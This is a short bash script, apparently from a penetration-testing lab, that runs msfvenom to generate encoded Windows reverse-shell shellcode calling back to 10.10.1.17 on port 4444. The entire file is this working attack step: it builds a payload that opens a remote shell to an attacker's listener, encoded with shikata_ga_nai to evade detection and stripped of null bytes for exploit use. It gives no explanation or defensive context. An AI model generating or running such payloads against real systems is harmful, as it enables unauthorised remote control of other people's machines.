#!/bin/bash

#HOST_IP = "10.10.1.17"
#HOST_PORT=4444

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.17 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00"
